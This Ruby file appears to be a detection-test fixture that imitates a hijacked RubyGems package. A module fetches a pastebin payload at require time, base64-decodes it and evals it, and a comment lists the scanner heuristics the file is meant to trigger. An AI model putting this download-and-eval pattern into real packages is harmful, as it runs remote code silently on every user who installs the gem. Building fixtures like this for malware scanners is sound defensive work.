# Generic shape of a RubyGems supply-chain attack: hijacked official-
# looking gem name, runs at require-time, drops a Bitcoin-clipper
# payload (matches the 2018 'rest-client' family + 2024 typosquat
# wave). This shape generalises the rest-client / strong_password
# era patterns we already capture.
#
# Detection target:
#   - dynamic-eval     (eval)
#   - net-egress       (Net::HTTP.get + URI.open)
#   - base64-decode    (Base64.decode64 of payload)
#   - obfuscated-payload (eval(Net::HTTP.get) — heuristics regex)
#   - suspicious-url   (pastebin.com on blocklist)

require "net/http"
require "base64"

module RubyGemsUpdate
  # The hijacked version added these few lines at module-load time.
  # Every `require 'rubygems-update'` triggered the chain.
  encoded = Net::HTTP.get(URI("https://pastebin.com/raw/aegis-test-fixture-not-a-real-paste"))
  payload = Base64.decode64(encoded)
  eval(payload)
end
